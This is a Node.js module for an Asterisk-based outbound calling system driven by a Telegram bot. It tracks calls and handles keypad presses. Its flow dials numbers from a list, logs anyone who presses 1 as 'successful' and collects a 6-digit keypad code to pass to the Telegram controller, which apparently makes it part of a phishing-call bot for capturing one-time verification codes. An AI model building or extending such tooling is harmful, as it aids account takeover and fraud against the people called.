const AMI = require("asterisk-manager");
const config = require("../config");
const {
  add_entry_to_database,
  pop_unprocessed_line,
} = require("../utils/entries");
const EventEmitter = require('events');

// Call tracking system
const activeCalls = new Map();
const channelToCallMap = new Map();
const dtmfEventEmitter = new EventEmitter();

console.log('\n=== ADVANCED DTMF DETECTION SYSTEM ===');
console.log('Real-time DTMF detection and call flow management');
console.log('Monitoring all Asterisk events for proper call handling\n');

// Utility functions for call tracking
function createCallSession(callId, phoneNumber, channel) {
  const session = {
    callId,
    phoneNumber,
    channel,
    status: 'initiated',
    timestamp: new Date(),
    menuPressed: null,
    dtmfCode: null,
    awaitingDTMF: false
  };
  
  activeCalls.set(callId, session);
  channelToCallMap.set(channel, callId);
  
  console.log(`📞 Created call session: ${callId} for ${phoneNumber}`);
  return session;
}

function getCallByChannel(channel) {
  const callId = channelToCallMap.get(channel);
  return callId ? activeCalls.get(callId) : null;
}

function updateCallStatus(callId, status, data = {}) {
  if (activeCalls.has(callId)) {
    const call = activeCalls.get(callId);
    call.status = status;
    call.lastUpdate = new Date();
    Object.assign(call, data);
    activeCalls.set(callId, call);
    
    console.log(`🔄 Call ${callId} status: ${status}`);
    if (Object.keys(data).length > 0) {
      console.log(`   Data:`, data);
    }
  }
}

const ami = new AMI(
  config.asterisk.port,
  config.asterisk.host,
  config.asterisk.username,
  config.asterisk.password,
  false  // Don't auto-reconnect
);

let isConnected = false;

ami.on("connect", () => {
  console.log("AMI is connected");
  isConnected = true;
});

ami.on("error", (err) => {
  console.error("AMI Connection Error:", err);
  isConnected = false;
});

ami.on("disconnect", () => {
  console.log("AMI disconnected");
  isConnected = false;
});

ami.on("managerevent", (data) => {
  // Log all events for debugging
  console.log('\n=== ASTERISK EVENT ===');
  console.log('Event:', data?.event);
  console.log('Full Data:', JSON.stringify(data, null, 2));
  console.log('========================\n');
  
  // Handle call origination to track channels properly
  if (data?.event === "OriginateResponse") {
    if (data?.response === "Success" && data?.channel) {
      const actionId = data?.actionid;
      const channel = data?.channel;
      const uniqueId = data?.uniqueid;
      
      console.log(`🚀 ORIGINATE SUCCESS: Channel ${channel}, ActionID: ${actionId}`);
      
      // Extract phone number from actionId (format: call-PHONENUMBER-timestamp)
      const phoneMatch = actionId?.match(/call-([+\d]+)-/);
      const phoneNumber = phoneMatch ? phoneMatch[1] : 'unknown';
      
      // Create call session immediately upon successful origination
      const callId = uniqueId || actionId;
      createCallSession(callId, phoneNumber, channel);
      
      console.log(`📞 Call session created for ${phoneNumber} on channel ${channel}`);
    }
  }
  
  // Handle DTMF keypad detection - ENHANCED WITH IMMEDIATE AUDIO STOPPING
  if (data?.event === "DTMFBegin" || data?.event === "DTMFEnd" || data?.event === "DTMF") {
    const digit = data?.digit;
    const channel = data?.channel;
    
    console.log(`\n🔢 === DTMF EVENT DETECTED ===`);
    console.log(`Digit: '${digit}'`);
    console.log(`Channel: ${channel}`);
    console.log(`Event Type: ${data?.event}`);
    console.log(`Direction: ${data?.direction || 'N/A'}`);
    console.log(`SubClass: ${data?.subclass || 'N/A'}`);
    
    // Try multiple ways to find the call
    let call = getCallByChannel(channel);
    
    // If not found by exact channel, try partial matching
    if (!call) {
      console.log(`❌ No exact channel match, trying partial matching...`);
      for (let [callId, callData] of activeCalls) {
        if (callData.channel && (channel.includes(callData.channel) || callData.channel.includes(channel))) {
          call = callData;
          console.log(`✅ Found call via partial match: ${callId}`);
          break;
        }
      }
    }
    
    // If still not found, create emergency call session
    if (!call) {
      console.log(`❌ No call found, creating emergency session...`);
      const emergencyCallId = `emergency_${Date.now()}`;
      call = createCallSession(emergencyCallId, 'unknown', channel);
      call.status = 'answered'; // Assume answered if we're getting DTMF
    }
    
    console.log(`📞 Call found/created:`);
    console.log(`   Call ID: ${call.callId}`);
    console.log(`   Phone: ${call.phoneNumber}`);
    console.log(`   Status: ${call.status}`);
    console.log(`   Channel: ${call.channel}`);
    
    // IMMEDIATELY STOP ANY CURRENT AUDIO when 1, 2, or 9 is pressed
    if (digit === '1' || digit === '2' || digit === '9') {
      console.log(`\n🛑 === STOPPING CURRENT AUDIO - DIGIT ${digit} PRESSED ===`);
      stopCurrentAudio(call.callId, channel);
      
      // Small delay to ensure audio stops before proceeding
      setTimeout(() => {
        processDTMFOption(call, digit);
      }, 200);
    } else if (call.awaitingDTMF && digit.match(/[0-9]/)) {
      // Collecting 6-digit DTMF code
      if (!call.dtmfCode) call.dtmfCode = '';
      call.dtmfCode += digit;
      
      console.log(`🔢 Building DTMF code: ${call.dtmfCode} (${call.dtmfCode.length}/6)`);
      
      if (call.dtmfCode.length === 6) {
        console.log(`✅ Complete 6-digit DTMF code received: ${call.dtmfCode}`);
        updateCallStatus(call.callId, 'dtmf_complete', { dtmfCode: call.dtmfCode });
        dtmfEventEmitter.emit('dtmfCodeReceived', call.callId, call.dtmfCode);
      }
    } else {
      console.log(`ℹ️ DTMF '${digit}' received - logging for analysis`);
      console.log(`   Call Status: ${call.status}`);
      console.log(`   Awaiting DTMF: ${call.awaitingDTMF}`);
      console.log(`   Menu Pressed: ${call.menuPressed}`);
    }
    
    console.log(`===============================\n`);
  }
  
  // Handle UserEvents from Asterisk dialplan
  if (data?.event === "UserEvent") {
    const call = getCallByChannel(data?.channel);
    
    switch (data?.userevent) {
      case 'CallStart':
        if (data?.destination) {
          console.log(`🚀 Call started to ${data?.destination}`);
          const callId = data?.uniqueid || `call_${Date.now()}`;
          createCallSession(callId, data?.destination, data?.channel);
        }
        break;
        
      case 'CallAnswered':
        if (call) {
          console.log(`📞 Call answered - Playing intro audio`);
          updateCallStatus(call.callId, 'playing_intro');
          dtmfEventEmitter.emit('callAnswered', call.callId);
        }
        break;
        
      case 'MenuOption':
        if (call && data?.option) {
          console.log(`🎯 Menu option ${data?.option} selected`);
          dtmfEventEmitter.emit('menuOption', call.callId, data?.option);
        }
        break;
        
      case 'DTMFCode':
        if (call && data?.code) {
          console.log(`🔢 DTMF Code from dialplan: ${data?.code}`);
          updateCallStatus(call.callId, 'dtmf_complete', { dtmfCode: data?.code });
          dtmfEventEmitter.emit('dtmfCodeReceived', call.callId, data?.code);
        }
        break;
        
      case 'InvalidCode':
        if (call) {
          console.log(`❌ Invalid DTMF code entered`);
          dtmfEventEmitter.emit('invalidCodeEntered', call.callId, data?.code || 'unknown');
        }
        break;
    }
  }
  
  // Handle call state changes
  if (data?.event === "Newstate" && data?.channelstatedesc === "Up") {
    console.log(`📞 Call answered on channel: ${data?.channel}`);
    const call = getCallByChannel(data?.channel);
    if (call) {
      updateCallStatus(call.callId, 'answered');
      // Emit call answered event for the bridge
      dtmfEventEmitter.emit('callAnswered', call.callId);
    }
  }
  
  // Handle call hangup
  if (data?.event === "Hangup") {
    const call = getCallByChannel(data?.channel);
    
    if (call) {
      console.log(`📴 Call ${call.callId} to ${call.phoneNumber} has ended`);
      console.log(`   Reason: ${data["cause-txt"]}`);
      console.log(`   Final Status: ${call.status}`);
      console.log(`   Menu Pressed: ${call.menuPressed || 'None'}`);
      console.log(`   DTMF Code: ${call.dtmfCode || 'None'}`);
      
      // Clean up call tracking
      activeCalls.delete(call.callId);
      channelToCallMap.delete(data?.channel);
      
      dtmfEventEmitter.emit('callEnded', call.callId, call);
    } else {
      console.log(`📴 Call ended on channel ${data?.channel} (no tracked call found)`);
    }
    
    // DISABLED: Auto call processing to prevent duplicates when using Telegram bot
    // setTimeout(() => processNextCall(), 1000);
  }
});

function waitForConnection() {
  return new Promise((resolve) => {
    const check = setInterval(() => {
      if (ami.connected) {
        clearInterval(check);
        resolve();
      }
    }, 1000);
  });
}

// DISABLED: processNextCall function to prevent automatic duplicate calls
// function processNextCall() {
//   const nextNumber = pop_unprocessed_line();
//   if (nextNumber) {
//     console.log('\nProceeding to next call...\n');
//     require("./call")(nextNumber);
//   } else {
//     console.log('\nNo more numbers to call.');
//   }
// }

// Export functions for external access
function getActiveCalls() {
  return Array.from(activeCalls.values());
}

function getCallById(callId) {
  return activeCalls.get(callId);
}

function setCallAwaitingDTMF(callId, awaiting = true) {
  if (activeCalls.has(callId)) {
    const call = activeCalls.get(callId);
    call.awaitingDTMF = awaiting;
    if (awaiting) {
      call.dtmfCode = ''; // Reset DTMF code
      console.log(`🔢 Call ${callId} is now awaiting 6-digit DTMF input`);
    }
    activeCalls.set(callId, call);
  }
}

// Enhanced DTMF processing functions
function stopCurrentAudio(callId, channel) {
  console.log(`🛑 Stopping current audio for call ${callId} on channel ${channel}`);
  
  if (isConnected && ami) {
    try {
      ami.action({
        action: 'redirect',
        channel: channel,
        context: 'bot-commands',
        exten: 'stop-audio',
        priority: 1
      }, (err, res) => {
        if (err) {
          console.error(`❌ Error stopping audio:`, err);
        } else {
          console.log(`✅ Audio stopped successfully for call ${callId}`);
        }
      });
    } catch (error) {
      console.error(`❌ Exception stopping audio:`, error);
    }
  } else {
    console.log(`⚠️ AMI not connected - cannot stop audio`);
  }
}

function processDTMFOption(call, digit) {
  console.log(`\n🎯 === PROCESSING DTMF OPTION ${digit} ===`);
  console.log(`Phone Number: ${call.phoneNumber}`);
  console.log(`Call ID: ${call.callId}`);
  
  switch (digit) {
    case '1':
      console.log(`🎉 USER PRESSED 1 - SUCCESS!`);
      updateCallStatus(call.callId, 'menu_selected', { menuPressed: '1' });
      
      // Add to successful database
      if (call.phoneNumber !== 'unknown') {
        add_entry_to_database(call.phoneNumber);
        console.log(`✅ Added ${call.phoneNumber} to successful database`);
      }
      
      // Play "please wait" message
      playPleaseWaitMessage(call.callId, call.channel);
      
      // Show Telegram menu after delay
      setTimeout(() => {
        dtmfEventEmitter.emit('showTelegramMenu', call.callId);
      }, 2000);
      break;
      
    case '2':
      console.log(`🔄 USER PRESSED 2 - Playing press2 audio`);
      updateCallStatus(call.callId, 'playing_press2', { menuPressed: '2' });
      dtmfEventEmitter.emit('menuOption', call.callId, '2');
      break;
      
    case '9':
      console.log(`📞 USER PRESSED 9 - Connecting to caller`);
      updateCallStatus(call.callId, 'connecting_to_caller', { menuPressed: '9' });
      dtmfEventEmitter.emit('menuOption', call.callId, '9');
      break;
  }
  
  console.log(`=========================================\n`);
}

function playPleaseWaitMessage(callId, channel) {
  console.log(`🕐 Playing "please wait" message for call ${callId}`);
  
  if (isConnected && ami) {
    try {
      ami.action({
        action: 'redirect',
        channel: channel,
        context: 'bot-commands',
        exten: 'play-please-wait',
        priority: 1
      }, (err, res) => {
        if (err) {
          console.error(`❌ Error playing please wait message:`, err);
        } else {
          console.log(`✅ Please wait message sent successfully for call ${callId}`);
        }
      });
    } catch (error) {
      console.error(`❌ Exception playing please wait message:`, error);
    }
  } else {
    console.log(`⚠️ AMI not connected - cannot play please wait message`);
  }
}

module.exports = { 
  ami, 
  waitForConnection, 
  dtmfEventEmitter,
  getActiveCalls,
  getCallById,
  setCallAwaitingDTMF,
  createCallSession,
  updateCallStatus,
  stopCurrentAudio,
  processDTMFOption,
  playPleaseWaitMessage
};
